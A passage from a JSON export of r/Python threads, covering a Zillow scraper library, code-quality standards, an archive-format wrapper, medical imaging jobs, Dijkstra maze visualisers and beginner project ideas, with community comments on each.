            "score": "64",
            "content": "Came to the comments for the code corrections. Wasn’t disappointed."
        },
        {
            "author": "SmellsLikeBu11shit",
            "score": "35",
            "content": "Your wife sound awesome OP"
        },
        {
            "author": "DillonSyp",
            "score": "7",
            "content": "Did you tell her about the commands? Or does she already know python?"
        },
        {
            "author": "Kidplayer_666",
            "score": "23",
            "content": "print(“that’s really cool pal!”) print(“also learning python”)"
        },
        {
            "author": "4stagi",
            "score": "4",
            "content": "Your wife's awesome :)"
        },
        {
            "author": "shellbackpacific",
            "score": "3",
            "content": "shes a keeper"
        },
        {
            "author": "Valrok_P99",
            "score": "3",
            "content": "At first glance after noticing the python logo, I thought it said 'classes are dumb'. Lol"
        },
        {
            "author": "lovetocode001",
            "score": "3",
            "content": "Nice tumbler"
        }
    ]
},
{
    "post_author": "JohnBalvin",
    "post_id": "1cblimn",
    "post_score": "71",
    "post_time": "Wednesday, April 24, 2024 at 4:08:25 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Zillow scraper made pure in Python",
    "media": [
        "https://github.com/johnbalvin/pyzill"
    ],
    "post_content": "Hello everyone., on today new scraper I created the python version for the zillow scraper.\nhttps://github.com/johnbalvin/pyzill\nWhat My Project Does\nThe library will get zillow listings and details.\nI didn't created a defined structured like on the Go version just because it's not as easy to maintain this kind of projects on python like on Go.\nIt is made on pure python with HTTP requests, so no selenium, puppeteer, playwright etc. or none of those automation libraries that I hate.\nTarget Audience\nThis project target could be real state agents probably, so lets say you want to track the real price history of properties around an area, you can use it track it\nComparison \nThere are libraries similar outhere but they look outdated, most of the time, scraping projects need to ne on constant maintance due to changed on the page or api\npip install pyzill\nLet me know what ou think, thanks\nabout me:\nI'm full stack developer specialized on web scraping and backend, with 6-7 years of experience",
    "comments": [
        {
            "author": "CatWeekends",
            "score": "33",
            "content": "This project target could be real state agents probably FWIW, every real estate agent I've ever met uses systems with way more info than Zillow. Your target audience is more likely people who want to track their own home value or something. Some questions; It looks like your code is copying the response keys. Any thoughts on making those a little nicer? IIRC they're not always very friendly. Zillow has some anti-scraping mechanisms built in. Does your code deal with those? Why are your methods capitalized like in Go? (it's not very pythonic - I'd suggest running your code through a linter)",
            "replies": [
                {
                    "author": "JohnBalvin",
                    "score": "3",
                    "content": "0) real state agents: tats good to know, I put that on the description because r/python has weird requirements in order to post something could you elaborate on this? could please send the link for the code where exactly is that happening? To be honest, I didn't see any bot protection at all, it could probably has bot protection when using browser automations tools like selenium, puppeteer or playwright , but using the api directly doens't seem to have any protection It's a bad habit, I'm mostly a Go developer and I tend to copy the patters from go to python, do you recommend a linter?",
                    "replies": [
                        {
                            "author": "rabelution",
                            "score": "5",
                            "content": "Ruff linter"
                        },
                        {
                            "author": "Vresa",
                            "score": "3",
                            "content": "3. New trending linter & formatter is `ruff` : https://github.com/astral-sh/ruff Old Standbys for linting and formatting are `black` + `flake8`"
                        },
                        {
                            "author": "markovianmind",
                            "score": "4",
                            "content": "for 2) do it fast enough with enough queries and most probably you would eb blocked.",
                            "replies": [
                                {
                                    "author": "JohnBalvin",
                                    "score": "0",
                                    "content": "that can be fixed just by using proxies, other than that they don't have bot protection at all"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "puppet_pals",
            "score": "9",
            "content": "Thanks for sharing your code - this is really cool! Due to the fact your package relies on the Zillow html structure, you might want to consider having some sort of integration tests running on github actions, and post the status badge in the README.",
            "replies": [
                {
                    "author": "JohnBalvin",
                    "score": "6",
                    "content": "I'll give it a try, but I don't promise that feature to be ready soon, I'm currently busy on my job"
                }
            ]
        },
        {
            "author": "mektel",
            "score": "3",
            "content": "Interesting dependency choice. pypi bs4 page. Github dependency links to a regex-training repo."
        },
        {
            "author": "KimPeek",
            "score": "3",
            "content": "Code could use linting and formatting"
        },
        {
            "author": "honor-",
            "score": "2",
            "content": "Hey I did this same thing awhile back. I 100% guarantee you’re going to get a TOS takedown from Zillow soon"
        },
        {
            "author": "JohnBalvin",
            "score": "3",
            "content": "btw, I'm looking for a job changed, if someone it's interested my social medias are on my github profile: https://github.com/johnbalvin",
            "replies": [
                {
                    "author": "nuke-from-orbit",
                    "score": "3",
                    "content": "Good luck and thanks for sharing code, my man."
                }
            ]
        },
        {
            "author": "luckyspic",
            "score": "2",
            "content": "completely request based makes this fire. down with the bloated rubbish lazy garbage that uses those libraries you mentioned. and you added proxy support as most should, 🐐"
        }
    ]
},
{
    "post_author": "nicomarcan",
    "post_id": "1cdmls1",
    "post_score": "12",
    "post_time": "Friday, April 26, 2024 at 5:18:29 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python Quality Standards",
    "media": [
        "https://gitgud.autonoma.app/?utm_source=reddit&utm_medium=post&utm_campaign=reddit-post&utm_id=reddit-post"
    ],
    "post_content": "Hey, happy Friday (don't push to prod). Me and some friends are building a no-code platform to run code improvement agents (really in BETA) .\nWe want to have a quality agent for each language, and I would really appreciate your feedback on python best practices and standards. The agents are created by defining the steps that you want to apply in natural language. Right now our Python agent has the following steps:\nUse descriptive naming for functions and variables.\nAdd Type Hints.\nAdd proper docstrings.\nMake docstrings follow PEP-257 standard.\nAll variables and functions should be snake_case.\nAdd proper input validation that checks for type and not null. If the input validation fails raise an Exception.\nAdd useful logs for debugging with the logging library.\nIn case you want to check our tool, we have a free playground right now at GitGud and are working on github PR integrations.\nHappy coding and thank you in advance for your help!\nEdit: Of course the steps are really basic right now, we are still testing the POC, so any feedback would be really appreciated",
    "comments": [
        {
            "author": "tylerlarson",
            "score": "20",
            "content": "Mostly those aren't actually quality standards. Type hinting is pretty important for tooling, but mostly you're agreeing on conventions you want to follow. Most of this isn't going to really impact your code quality. Here are some useful standards (these are all perfectly realistic; they were required when I worked at Google): Code review: Everything gets thoroughly reviewed by at least one other programmer, and not just rubber stamped. All reviewers are EQUALLY responsible for the code they approve as if they wrote it themselves. They must understand it and generally agree with the approach, as well as agree that it belongs in the codebase. Testing: Everything has tests. Code without tests is not considered production and shouldn't ever run against production data. Coverage percentages are only a hint, what matters is functionality. Your tests are your spec; any code that passes your tests is considered \"correct\" and works perfectly, otherwise your tests are insufficient. You should be comfortable giving your application to a new intern and letting them \"optimize\" it however they see fit, and if it passes the tests at the end then you know they didn't break anything. Configuration: All configuration is done through code and config files. All config files are checked into source control BEFORE it is activated. There must be literally zero knowledge any one person maintains only in their head which is required to make things work, beyond just how to fire up the automation. And yes, changes to configuration have the same code review standards as source code. You have to get someone to approve it. Emergencies: You are allowed to deviate from these rules to address an emergency, but you have to document the what and why in the post-mortem. As soon as practicable, you have to bring things back into compliance with the expectations. Part of the post-mortem is documenting those changes and providing TODOs for how to make it possible to address the same problem again in the future without it being an emergency, so this doesn't become a \"thing.\"",
            "replies": [
                {
                    "author": "nicomarcan",
                    "score": "-1",
                    "content": "Great! When did you work at Google? I worked from July 2022 until September 2023",
                    "replies": [
                        {
                            "author": "tylerlarson",
                            "score": "2",
                            "content": "2014 to 2023"
                        }
                    ]
                }
            ]
        },
        {
            "author": "lightmatter501",
            "score": "8",
            "content": "mypy strict (this means no Any) ruff pylama If your codebase is fine after turning all of that on, you will be fine.",
            "replies": [
                {
                    "author": "fast-90",
                    "score": "1",
                    "content": "What does pylama add in addition to mypy and ruff? Looking at their repo, it seems that it covers mostly the same checks?"
                }
            ]
        },
        {
            "author": "metaphorm",
            "score": "2",
            "content": "so it's a linter?",
            "replies": [
                {
                    "author": "nicomarcan",
                    "score": "1",
                    "content": "Not necessary. Is a platform intended to automate tasks like: Input validation, error handling, logs, docstrings, tests, etc . We have some agents that create automatic tests, another improve quality, other add comments, etc. The idea is to be as flexible as we want. You can create agents to do whatever you decide."
                }
            ]
        },
        {
            "author": "chinapandaman",
            "score": "3",
            "content": "At work we use SonarQube for this kind of stuffs. I believe they have a community edition as well so maybe checkout and go through their rules? For my personal project I use pylint so I’d also go through their rules too.",
            "replies": [
                {
                    "author": "nicomarcan",
                    "score": "1",
                    "content": "Our goal for this platform is to be complementary to static code analysis tools like Sonar. We want to tackle semantic problems with GenAI that this tools can't find."
                }
            ]
        },
        {
            "author": "dsethlewis",
            "score": "1",
            "content": "On the config point—what about secrets/environment variables?"
        },
        {
            "author": "not_perfect_yet",
            "score": "1",
            "content": "cyclomatic complexity https://radon.readthedocs.io/en/latest/intro.html"
        }
    ]
},
{
    "post_author": "PredatorOwl",
    "post_id": "1censu3",
    "post_score": "16",
    "post_time": "Saturday, April 27, 2024 at 11:14:25 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ArchiveFile: Unified interface for tar, zip, sevenzip, and rar files",
    "media": [
        "https://github.com/miurahr/py7zr",
        "https://github.com/Ravencentric/archivefile",
        "https://docs.python.org/3/library/zipfile.html",
        "https://ravencentric.github.io/archivefile",
        "https://docs.python.org/3/library/tarfile.html",
        "https://github.com/markokr/rarfile"
    ],
    "post_content": "What My Project Does\narchivefile is a wrapper around tarfile, zipfile, py7zr, and rarfile. The above libraries are excellent when you are dealing with a single archive format but things quickly get annoying when you have a bunch of mixed archives such as .zip, .7z, .cbr, .tar.gz, etc because each library has a slightly different syntax and quirks which you need to deal with. archivefile wraps the common methods from the above libraries to provide a unified interface that takes care of said differences under the hood. However, it's not as powerful as the libraries it wraps due to lack of support for features that are unique to a specific archive format and library.\nTarget audience\nAnyone who's using python to deal with different archive formats\nComparison\nZipFile, TarFile, RarFile, and py7zr - These are libraries that mine wraps since each of them can only deal with a single archive format\nshutil - Shutil can only deal with zipfile and tarfile and only allows full packing or full extraction.\npatool - Excellent library that deals with wider range of formats than mine but in doing so it provides less granular control over each ArchiveFile falls somewhere between the powerful dedicated library and the far less powerful universal libaries.\nLinks\nRepository: https://github.com/Ravencentric/archivefile Docs: https://ravencentric.github.io/archivefile",
    "comments": [
        {
            "author": "VooDooNOFX",
            "score": "2",
            "content": "This is very helpful! A question though: Why do I need to open the archive file in write mode just to extract something: with ArchiveFile(\"archive.tar\", \"w\") as archive: archive.extract(\"member.txt\") # Extract a single member of the archive Also, why did you name each file in your source “_something”?",
            "replies": [
                {
                    "author": "PredatorOwl",
                    "score": "10",
                    "content": "Why do I need to open the archive file in write mode just to extract something: You don't, seems to be just a typo in examples Also, why did you name each file in your source “_something”? They are private and not meant to be imported by end user. Common python convention is to use underscore as a prefix to indicate something is not part of the public api"
                }
            ]
        },
        {
            "author": "ZachVorhies",
            "score": "2",
            "content": "Thanks I wanted to do something like this."
        },
        {
            "author": "Brian",
            "score": "1",
            "content": "libarchive would be worth mentioning as a comparison, as I believe it supports all of those and more. Downside is that it's not the nicest API (mostly the same as the C API of the libarchive library it wraps), and it can't do stuff like efficient random access in formats that can support it, like zip."
        },
        {
            "author": "zom-ponks",
            "score": "1",
            "content": "Huh, I was looking for something like this just recently since I'm dealing with a lot of archive files, doing some extraction and cleaning up directory structures etc. etc., and of course there's several formats to contend with. At first I just looked at the extension and then passed it on to a different subroutine depending on format, but as the complexity of the script is growing this is frustrating. So looks like this is just what the doctor ordered! Thank you, I just installed it and will try it soonish."
        }
    ]
},
{
    "post_author": "Durysik",
    "post_id": "1cfx0qe",
    "post_score": "12",
    "post_time": "Monday, April 29, 2024 at 2:44:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Medical imaging Python jobs",
    "media": [],
    "post_content": "Hi folks!\nI am currently looking for a US (west coast best) based job where I could grow as a python programmer, specifically analysing medical images.\nLooking online I found some labs where they work with images, but I thought I'd ask (not sure if it's the right sub tho) cause I'm sure this way I'll hear about many places that deal with Medical Imaging.\nThanks :)",
    "comments": [
        {
            "author": "riklaunim",
            "score": "4",
            "content": "There are some medical database that can be used for R&D (not sure about access though) but for live medical operations 100% of tasks will be made on certified hardware and software, no software developers tinkering. You could look for companies doing machine vision, specialized imaging type of stuff, although likely they won't use Python, depends.",
            "replies": [
                {
                    "author": "aganders3",
                    "score": "3",
                    "content": "You can write software for medical devices and software as a medical device (SAMD) in Python, at least for class II devices. Most imaging applications just require documentation of product and process. I’ve built a career in imaging, mostly medical imaging, and much of my work has been Python.",
                    "replies": [
                        {
                            "author": "Durysik",
                            "score": "1",
                            "content": "Thanks for the answer! So the key is looking for companies producing such medical devices? Could I pm you?",
                            "replies": [
                                {
                                    "author": "aganders3",
                                    "score": "1",
                                    "content": "Sure"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Durysik",
                    "score": "2",
                    "content": "Thanks! During uni, I've used various databases with medical images (for instance I've had two projects with tumor segmentation). Machine vision - I'll check it out! Why won't they use python? Is c++ more popular, or sth entirely different? I thought python is commonly used with image processing.",
                    "replies": [
                        {
                            "author": "riklaunim",
                            "score": "2",
                            "content": "There are established software stacks or apps already like GeniCam and most vendors support that and they offer their own APIs. For Python the support usually isn't first-class or not present at all. https://rkblog.dev/posts/python/scripting-machine-vision-and-astronomical-cameras-python/",
                            "replies": [
                                {
                                    "author": "Durysik",
                                    "score": "2",
                                    "content": "Thanks! That's definitely sth to read :)"
                                }
                            ]
                        },
                        {
                            "author": "qckpckt",
                            "score": "2",
                            "content": "The computer vision libraries in python are often basically python api wrappers around lower level libraries written in c and other compiled languages because it just makes more sense to use a language that runs closer to the hardware for tasks like image processing. The same is true for a lot of data science packages too. Python is the language of choice because it’s accessible, popular, and relatively easy to guarantee that you can run it on different forms of hardware.",
                            "replies": [
                                {
                                    "author": "Durysik",
                                    "score": "1",
                                    "content": "Ok, I get what you mean, right..."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "codesauce",
            "score": "2",
            "content": "Job: https://pearl-ai.breezy.hr/p/20630cb6a1f6-machine-learning-scientist?source=www.hellopearl.com/contact If you don't already know: https://www.dicomstandard.org/",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "2",
                    "content": "Thanks! I am well versed with Dicom :) Not a machine learning expert tho, I have some experience but I'm not a pro :/"
                }
            ]
        },
        {
            "author": "MonkeyboyGWW",
            "score": "1",
            "content": "Oracle have some projects like that going at the moment.",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "1",
                    "content": "Oracle! Thanks!"
                }
            ]
        },
        {
            "author": "SquiffyUnicorn",
            "score": "1",
            "content": "You could do worse than looking at SIIM- Society of Imaging Informatics in Medicine. I’m sure you could make appropriate contacts there. Also, if you are anywhere near Stanford they have a world class medical AI lab. The boss is Curt Langloltz- very famous in the radiology AI world. He recently visited Singapore (where I am) - very nice guy.",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "1",
                    "content": "That's some solid tips! I'll check out both, thank you so much!!"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ce0l10",
    "post_score": "0",
    "post_time": "Saturday, April 27, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "mutatedllama",
    "post_id": "fsuibu",
    "post_score": "1906",
    "post_time": "Wednesday, April 1, 2020 at 9:49:15 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Maze Solver Visualizer - Dijkstra's algorithm (asynchronous neighbours)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "85",
            "content": "I think it is, and it's something I want to add so the user can switch between algorithms and see the different options. I went with Dijkstra because in all honestly it was the first one I heard of. Before doing this I had no clue about pathfinding and when I heard about Dijkstra's algorithm I thought it sounded cool so I got to work on coding it. Firstly I put together an algorithm that worked without visuals (it was a codewars challenge) but it felt underwhelming. I saw some videos on YouTube, specifically one from Clement M where he had implemented the visuals beautifully in what I think is javascript. I took that as inspiration to adapt my code to a visualisation in pygame. The satisfaction of seeing an algorithm being applied visually is huge for me. I struggle with mere concepts, and seeing it work in this way makes me feel like I really understand it.",
            "replies": [
                {
                    "author": "mutatedllama",
                    "score": "64",
                    "content": "I think it is, and it's something I want to add so the user can switch between algorithms and see the different options. I went with Dijkstra because in all honestly it was the first one I heard of. Before doing this I had no clue about pathfinding and when I heard about Dijkstra's algorithm I thought it sounded cool so I got to work on coding it. Firstly I put together an algorithm that worked without visuals (it was a codewars challenge) but it felt underwhelming. I saw some videos on YouTube, specifically one from Clement M where he had implemented the visuals beautifully in what I think is javascript. I took that as inspiration to adapt my code to a visualisation in pygame. The satisfaction of seeing an algorithm being applied visually is huge for me. I struggle with mere concepts, and seeing it work in this way makes me feel like I really understand it.",
                    "replies": [
                        {
                            "author": "jdk42",
                            "score": "21",
                            "content": "Visualizing algorithms is one of the best ways of understanding, but also a very nice way of doing sanity checks - is the actually correct and does the algorithm actually work. Nice job!"
                        },
                        {
                            "author": "livrem",
                            "score": "11",
                            "content": "The book Mazes for Programmers has great visualizations of paths through mazes and last time I checked the author still had a web site with some of them and javascript generators/solvers. Highly recommend."
                        },
                        {
                            "author": "enes81",
                            "score": "14",
                            "content": "https://www.redblobgames.com/pathfinding/a-star/introduction.html check this out. It can help with other algorithms"
                        },
                        {
                            "author": "KilroyWasHere189",
                            "score": "2",
                            "content": "A* is hypothetically better but I don't think you'd see that much of a difference. Good job."
                        },
                        {
                            "author": "66bananasandagrape",
                            "score": "2",
                            "content": "Fun fact: if all of the distances in the graph are the same, then Dijkstra's algorithm is actually equivalent to breadth-first search."
                        }
                    ]
                },
                {
                    "author": "livrem",
                    "score": "3",
                    "content": "Dijkstra's is one-to-many, not only one-to-one. It will beat A* for finding paths when they share a common source or goal."
                }
            ]
        },
        {
            "author": "AndreKuzwa",
            "score": "10",
            "content": "Great job man! I have recently finished the same project with option to chose between Dijskra and A* but I can clearly see that your Dijskra works much faster! Would you be so kind to share the source code, I think my implementation of the algorithm might not be optimal. Thanks and great job again!"
        },
        {
            "author": "[deleted]",
            "score": "10",
            "content": "This is so beautiful 😍"
        },
        {
            "author": "DenormalHuman",
            "score": "4",
            "content": "Good stuff! but I'd like to see it work on more complex mazes with many branching paths etc.."
        },
        {
            "author": "spikte1502",
            "score": "2",
            "content": "You gave the subject of my next project, very nice"
        },
        {
            "author": "elburro908",
            "score": "2",
            "content": "nice job! you should move it to the 3-D world. Gives a bit more challenge but it can be much fun."
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Love this, its much better than mine. Thanks for sharing! Keep it up!"
        },
        {
            "author": "gymboi15",
            "score": "2",
            "content": "Awh man and all I know is the random module :("
        },
        {
            "author": "dirtflake",
            "score": "2",
            "content": "Really good"
        }
    ]
},
{
    "post_author": "snorkell_",
    "post_id": "1cbuape",
    "post_score": "4",
    "post_time": "Wednesday, April 24, 2024 at 12:58:10 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Created Netlify DNS Manager: CLI Tool for uploading zone Files to Netlify or exporting Netlify DNS",
    "media": [
        "https://github.com/sumansaurabh/netlify-dns-manager"
    ],
    "post_content": "What My Project Does?\nCommand-line tool to simplify the management of DNS records for domains hosted on Netlify, whether you want to migrate to Netlify or migrate away from Netlify.\nImport Zone File from Godaddy, NameCheap or others to Netlify - helpful in migrating nameservers.\nExport DNS records from Netlify as zonefile to be import it to Godaddy, Namecheap or other servers.\nZonefile is a list of all the DNS records for a given domain\nHere is the url - https://github.com/sumansaurabh/netlify-dns-manager\nTarget Audience (e.g., Is it meant for production, just a toy project, etc.)\nAnyone who is intended to use Netlify DNS.\nComparison (A brief comparison explaining how it differs from existing alternatives.)\nThere is no such tool that can help in managing DNS in Netlify - hence I have created it.",
    "comments": []
},
{
    "post_author": "br_web",
    "post_id": "1ca9x6h",
    "post_score": "8",
    "post_time": "Monday, April 22, 2024 at 3:50:30 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Is Pythonista (Python for iOS/iPadOS) no longer with active development and support?",
    "media": [],
    "post_content": "I have not seen updates in almost a year and there is no activity in the support forum? Is there a replacement forum? Thanks",
    "comments": [
        {
            "author": "KingsmanVince",
            "score": "2",
            "content": "I suppose so. On their github, they don't answer to any issues.",
            "replies": [
                {
                    "author": "br_web",
                    "score": "2",
                    "content": "It’s unfortunate for such a great app"
                }
            ]
        },
        {
            "author": "Mezzomaniac",
            "score": "2",
            "content": "There was a long period of time between when the Pythonista version that had Python 3.6 came out and when the version with Python 3.10 came out, with little info during that time about updates. I wouldn’t be surprised if there was a sudden upgrade to eg Python 3.13. Not sure how active the Pythonista community is on the forum though."
        },
        {
            "author": "ForceBru",
            "score": "2",
            "content": "Basically yes, but it's one of the best Python IDEs for iOS to this day. I've been using it for years now, haven't encountered a single bug or glitch. Everything works: plots with Matplotlib, math with NumPy, web scraping, random tinkering. You can even mess with the app's internals using Objective-C bindings. Change the UI and go bananas. I think it's simply a finished product, so there's not much to add, everything already works flawlessly. The latest update brought Python 3.10 and broke the app on iOS 12.4. Other than Python version updates, I don't see what can significantly improve Pythonista at this point. What kind of support are you looking for? Something specific to the app?",
            "replies": [
                {
                    "author": "br_web",
                    "score": "3",
                    "content": "It is nice to have a community support environment for Q&A and other things, plus keeping the app up to date with new iOS and iPadOS releases and features, pretty soon will start missing those benefits"
                },
                {
                    "author": "dougri",
                    "score": "1",
                    "content": "Curious, have you been able to install any packages that would allow plotting on maps (e.g., basemap, geopandas, folium, etc.)?"
                },
                {
                    "author": "sambrightman",
                    "score": "1",
                    "content": "I don’t think it’s just “finished”. The forum has gone down too."
                }
            ]
        }
    ]
},
{
    "post_author": "arthurdelerue25",
    "post_id": "1cdgodr",
    "post_score": "3",
    "post_time": "Friday, April 26, 2024 at 12:03:39 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How To Build a Social Media Sentiment Analysis Pipeline With FastAPI And Generative AI",
    "media": [
        "https://kwatch.io/how-to-build-a-social-media-sentiment-analysis-pipeline"
    ],
    "post_content": "Social media like Reddit, Hacker News, Twitter, etc. contain tons of genuine discussions that you might want to analyze automatically with sentiment analysis. For example you might want to monitor what people say about you, your product, your competitors, etc.\nI made a technical article that shows how to implement such a sentiment analysis pipeline using the following steps:\nImplement social media listening\nIntegrate the data in your system with an API webhook processed in Python/FastAPI\nAnalyze the sentiment thanks to generative AI models like GPT-4, LLaMA 3, ChatDolphin, etc.\nHere it is: https://kwatch.io/how-to-build-a-social-media-sentiment-analysis-pipeline\nI hope you will find it useful. If you have some comments about how to improve this pipeline I would love to hear them!\nArthur",
    "comments": [
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Using AI to analyse sentiment takes to long, just use a good, neutral, negative word list. Where each post gets a value; +1 for positive. 0 for neutral. -1 for negative. Each post gets it's own score. Example: [Message id, score, datetime_data] Track avarege score over dates to changes in sentiment represented by a number and weigths for how many posts on each day. More work but hey, its a better solution. Using ai to track sentiment feels like using a super computer to calculate 1+1.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "1",
                    "content": "Regex matching or string matching."
                }
            ]
        }
    ]
},
{
    "post_author": "mutatedllama",
    "post_id": "fxpf9l",
    "post_score": "1952",
    "post_time": "Thursday, April 9, 2020 at 12:29:47 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Dijkstra's algorithm now running in linear time on a 90x90 grid",
    "media": [
        "https://external-preview.redd.it/MkYNaQMlTyMD8gVwfrEzwDVdLAQXfh1F0p-bu-0YZoA.png?width=640&crop=smart&format=pjpg&auto=webp&s=159b804714faafa81974ed787879b83a25e3b438"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Wolfsdale",
            "score": "142",
            "content": "Very cool! Maybe you can add some \"slow\" blocks that the path finder can move through but at increased 'distance' so you can have your Dijkstras really shine -- the algorithm would have to pick between going through the slow blocks or around it. I checked out your code, and it looks very good! However, in your priority queue you appear to \"de-duplicate\" already. That is not correct unfortunately -- with Dijkstra you cannot deduplicate the queue. When you take something from the priority queue, that's when you check if you already visited it and do nothing if that's the case. Important in Dijkstra is that there may be a path with more \"hops\" that is actually shorter. A direct edge from A to X may be dist(A,X)=10, while a route via node B may be dist(A,B)=5 and dist(B,X)=3. Since going via B is shorter, you want that one. Even if it's an extra hop. Here's an ugly paint picture of that graph. You deal with this by adding (node=X,dist=10) and (node=B,dist=5) to the queue when you loop over the neighbors of A. priority queue: {(node=B, dist=5), (node=X, dist=10)} Because 5 < 10, node B will be visited next. Looping over the neighbors of B reveals this path from B to X of dist 3, which is added as (node X, dist=8). Now your priority queue will look like this: priority queue: {(node X, dist=8), (node X, dist=10)} That's right, node X is in there twice! In Dijkstra, it's perfectly okay to add (node X, dist=8) to the queue if (node X, dist=10) is already in the queue. Since it's a priority queue, it will first grab the dist=8 version first. Then, later on when trying to grab the dist=10 version it's already marked as visited so it won't do anything. If it never added the (node X, dist=8) it would not have found the shortest path. Well then why does it work? Very simple, because you use a grid your edge distances are 1. Meaning that when it adds something the first time, it also happens to find the shortest path already. That is why Breadth-First-Search, which only works when all edge distances are 1, can use a very simple FIFO queue instead of a priority queue. BFS can also deduplicate before the queue.",
            "replies": [
                {
                    "author": "mutatedllama",
                    "score": "37",
                    "content": "I'm so grateful for your post, it cleared up some suspicions I had but weren't fully developed in my head. I removed the de-duplication (it actually did nothing for my code anyway) and added in diagonal movement at a distance of 20.5 (see https://gfycat.com/neatrightflyinglemur) It seems to run well so is proof of concept I think, but I love the idea of slow blocks like sticky mud or something! That will be my next goal and then following that some other algorithms such as BFS and then mayeb A*."
                },
                {
                    "author": "mutatedllama",
                    "score": "17",
                    "content": "Here is the version with \"sticky mud\", which doubles the \"distance\" over those nodes. https://gfycat.com/highlevelphysicalconure I'm pretty happy with it!",
                    "replies": [
                        {
                            "author": "xsdf",
                            "score": "6",
                            "content": "Hey that's really cool! A more realistic scenario would have varying cost for each tile but I think this demonstrates the point quite well. Next, I'd take a look at the A* algorithm to optimize pathfinding."
                        },
                        {
                            "author": "Wolfsdale",
                            "score": "4",
                            "content": "Pretty cool! The animation really shows how nicely Dijkstra works -- it visits nodes that are further away from the start later. Dijkstra (and BFS) are so-called greedy algorithms. Once having visited a node, the shortest path to it has been determined and it won't ever change. You could try and make a \"French flag\"-style map, where the white section of the flag are mud blocks and the blue and red are regular blocks. Path finding from the left top to the right bottom should look like how light refracts through thicker materials like glass."
                        },
                        {
                            "author": "BetaDecay121",
                            "score": "2",
                            "content": "Can you use this to derive Snell's law of refraction now?"
                        }
                    ]
                },
                {
                    "author": "mutatedllama",
                    "score": "6",
                    "content": "Ahhh thank you, what you've said all makes sense. I will get to work on implementing your points ASAP!"
                },
                {
                    "author": "Kidiri90",
                    "score": "5",
                    "content": "Important in Dijkstra is that there may be a path with more \"hops\" that is actually shorter. A direct edge from A to X may be dist(A,X)=10, while a route via node B may be dist(A,B)=5 and dist(B,X)=3. Since going via B is shorter, you want that one. The difference between taking a train from NYC to Washington D.C. that goes via Chicago; and taking a train from NYC to Philadelphia, followed by one from Philadelphia to Washington D.C. If my understanding is correct."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "20",
            "content": "Disclaimer: CS beginner here, so take this with a grain of salt. The time complexity of Dijkstra's shortest path graph processing algorithm is O(E log V) (\"linearithmic\" or \"superlinear\" time in worst-case, not linear) where E is the number of graph edges and V is the number of graph vertices. To convince yourself of this, realize that indexed priority queue (the auxiliary data structure that you are using in the algorithm) operations (push/pop) run in O(log n) (logarithmic time in worst-case). The queue holds a maximum of V items and is being engaged for each encountered edge (in the set E) during the edge relaxation. Thus, the worst-case performance (upper bound) of E log V. All of this is assuming that you are using adjacency list graph implementation. Topological sort shortest path graph processing algorithm grows in O(E+V), linear time (slightly faster than Dijkstra). It will not work on graphs with directed cycles though (Dijkstra will not work with negative edges). It is used to implement this image processing technique: https://www.youtube.com/watch?v=6NcIJXTlugc EDIT: Fantastic visualization, btw."
        },
        {
            "author": "Ephy_Gle",
            "score": "15",
            "content": "Good work! Though Dijkstra works pretty much like a simple breadth-first search on a grid like this which is not really efficient. If you're interested in pathfinding algorithms maybe look at something like A* and WA* which should be much more efficient!"
        },
        {
            "author": "Conrad_noble",
            "score": "98",
            "content": "As cool and interesting as all these similar projects are, what are the practical real world uses?"
        },
        {
            "author": "PollenStillPotent",
            "score": "2",
            "content": "Gorgeous!"
        },
        {
            "author": "mcramer",
            "score": "2",
            "content": "That is a very cool rendering! I'd love to see how it compares to A*. If you're really interested in speed, for the heuristic if you use the Manhattan distance you could cache the values."
        },
        {
            "author": "hornetjockey",
            "score": "2",
            "content": "Well that's fucking awesome."
        }
    ]
},
{
    "post_author": "Im__Joseph",
    "post_id": "ne1kkx",
    "post_score": "1902",
    "post_time": "Monday, May 17, 2021 at 3:00:18 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Comment any project ideas beginner or advanced in this thread for others to give a try! If you complete one make sure to reply to the comment with how you found it and attach some source code!",
    "comments": [
        {
            "author": "StatementNervous",
            "score": "13",
            "content": "I am turning 63 young years in 2021. What is the best route to learn Python? I want to keep my mind as sharp as possible.",
            "replies": [
                {
                    "author": "L_-T",
                    "score": "2",
                    "content": "What are you interested to do with Python? Pick something that really motivates you. Are you new to programming?",
                    "replies": [
                        {
                            "author": "StatementNervous",
                            "score": "5",
                            "content": "I am new to programming. Programming is a challenge I wish to begin and use in the future."
                        },
                        {
                            "author": "Pokaia",
                            "score": "1",
                            "content": "https://learnpythontherightway.com/"
                        }
                    ]
                },
                {
                    "author": "EasyPleasey",
                    "score": "1",
                    "content": "The most helpful thing you can do is get a good environment to play with Python in. If you have a Mac or Linux device you can easily get into the python shell and run code directly from the command line. If you have a PC I would suggest either installing PyCharm or, my preference, enable the Windows Subsystem for Linux so that you can natively run Linux on your laptop. Alternatively, buy a raspberry pi and set it up and then you can play around with the pre-installed pygame library that comes with every Pi. It's really a lot of fun to see how these games work and how you can change the rules and make it do whatever you want. Have fun.",
                    "replies": [
                        {
                            "author": "ThePiGuy0",
                            "score": "3",
